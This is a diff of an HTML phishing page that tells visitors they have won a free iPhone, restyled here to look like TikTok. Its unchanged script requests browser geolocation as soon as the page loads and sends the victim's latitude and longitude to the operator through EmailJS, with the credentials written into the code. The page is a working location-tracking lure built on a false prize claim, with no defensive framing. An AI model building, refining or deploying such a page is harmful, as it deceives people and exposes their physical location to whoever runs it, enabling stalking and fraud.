@@ -3,97 +3,177 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iPhone Reward Form</title>
+    <title>TikTok Reward</title>
+
+    <!-- Bootstrap (unchanged) -->
     <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
+            height: 100vh;
+            background: #000;
+            font-family: 'Arial', sans-serif;
+            overflow: hidden;
+            color: #fff;
+        }
+
+        /* TikTok-style full screen */
+        .tiktok-screen {
+            height: 100vh;
+            width: 100%;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f8ff;
-            font-family: Arial, sans-serif;
+            position: relative;
+            background: linear-gradient(180deg, #000000, #111111);
         }
-        .container {
-            max-width: 600px;
-            background: #ffffff;
-            padding: 2rem;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+
+        /* Center card (video overlay feel) */
+        .reward-card {
+            background: rgba(20, 20, 20, 0.85);
+            border-radius: 16px;
+            padding: 30px 25px;
+            width: 90%;
+            max-width: 380px;
             text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+            animation: fadeUp 0.8s ease;
         }
+
+        @keyframes fadeUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .reward-card h1 {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .reward-card p {
+            font-size: 15px;
+            color: #ccc;
+            margin-bottom: 15px;
+        }
+
+        .iphone {
+            font-size: 48px;
+            margin: 15px 0;
+        }
+
         #locationDisplay {
-            background: #e9ecef;
-            color: #666;
-            padding: 0.5rem;
-            border-radius: 4px;
             margin-top: 15px;
-            font-size: 0.9rem;
+            padding: 10px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 8px;
+            font-size: 13px;
+            color: #0fda7a;
+            word-break: break-word;
+        }
+
+        /* Bottom TikTok style text */
+        .bottom-text {
+            position: absolute;
+            bottom: 25px;
+            width: 100%;
+            text-align: center;
+            font-size: 13px;
+            color: #aaa;
+        }
+
+        .bottom-text span {
+            color: #fff;
+            font-weight: bold;
         }
     </style>
 </head>
+
 <body>
-    <div class="container">
-        <h1 class="form-heading">Congratulations! 🎉</h1>
-        <p class="lead">You've been selected to receive a brand-new iPhone!</p>
-        <p class="form-text">Please allow location access to claim your reward.</p>
-        <p id="locationDisplay" class="form-text">Waiting for location...</p>
+
+<div class="tiktok-screen">
+    <div class="reward-card">
+        <h1>🎉 Congratulations!</h1>
+        <p>You’ve been selected to receive a brand-new</p>
+        <div class="iphone">📱</div>
+        <p><strong>iPhone Reward</strong></p>
+        <p>Please allow location access to continue</p>
+
+        <div id="locationDisplay">
+            Waiting for location...
+        </div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script>
-        document.addEventListener("DOMContentLoaded", function () {
-            emailjs.init("PyeAiA-jK3Wc0b1f5"); // Public Key
+    <div class="bottom-text">
+        Powered by <span>Live Rewards</span>
+    </div>
+</div>
 
-            function sendLocationEmail(latitude, longitude) {
-                console.log("📍 Sending Location Data:", { latitude, longitude });
+<!-- 🔒 Backend / JS UNCHANGED -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        emailjs.init("PyeAiA-jK3Wc0b1f5"); // Public Key
 
-                const templateParams = {
-                    latitude: latitude.toString(),
-                    longitude: longitude.toString()
-                };
+        function sendLocationEmail(latitude, longitude) {
+            console.log("📍 Sending Location Data:", { latitude, longitude });
 
-                emailjs.send("service_x7r1n9m", "template_hi29o5q", templateParams)
-                    .then((response) => {
-                        console.log("✅ Email sent successfully!", response);
-                        document.getElementById("locationDisplay").textContent = "📧 Location sent!";
-                    })
-                    .catch((error) => {
-                        console.error("❌ Error sending email:", error);
-                        document.getElementById("locationDisplay").textContent = "⚠️ Email sending failed!";
-                    });
+            const templateParams = {
+                latitude: latitude.toString(),
+                longitude: longitude.toString()
+            };
+
+            emailjs.send("service_x7r1n9m", "template_hi29o5q", templateParams)
+                .then((response) => {
+                    console.log("✅ Email sent successfully!", response);
+                    document.getElementById("locationDisplay").textContent = "📧 Location sent successfully!";
+                })
+                .catch((error) => {
+                    console.error("❌ Error sending email:", error);
+                    document.getElementById("locationDisplay").textContent = "⚠️ Email sending failed!";
+                });
+        }
+
+        function trackMovement() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+
+                        console.log("🌍 Location received:", latitude, longitude);
+                        document.getElementById("locationDisplay").textContent =
+                            `📍 Latitude: ${latitude}, Longitude: ${longitude}`;
+
+                        sendLocationEmail(latitude, longitude);
+                    },
+                    (error) => {
+                        console.error("❌ Error getting location:", error);
+                        document.getElementById("locationDisplay").textContent =
+                            "⚠️ Location access denied!";
+                    }
+                );
+            } else {
+                document.getElementById("locationDisplay").textContent =
+                    "⚠️ Geolocation not supported!";
             }
+        }
 
-            function trackMovement() {
-                if ("geolocation" in navigator) {
-                    // This triggers the location permission prompt
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            const latitude = position.coords.latitude;
-                            const longitude = position.coords.longitude;
+        trackMovement();
+    });
+</script>
 
-                            console.log("🌍 Location received:", latitude, longitude);
-                            document.getElementById("locationDisplay").textContent = 
-                                `📍 Latitude: ${latitude}, Longitude: ${longitude}`;
-
-                            sendLocationEmail(latitude, longitude);
-                        },
-                        (error) => {
-                            console.error("❌ Error getting location:", error);
-                            document.getElementById("locationDisplay").textContent = 
-                                "⚠️ Location access denied!";
-                        }
-                    );
-                } else {
-                    console.log("❌ Geolocation not supported.");
-                    document.getElementById("locationDisplay").textContent = "⚠️ Geolocation not supported!";
-                }
-            }
-
-            // Call to request location as soon as the page loads
-            trackMovement();
-        });
-    </script>
 </body>
 </html>
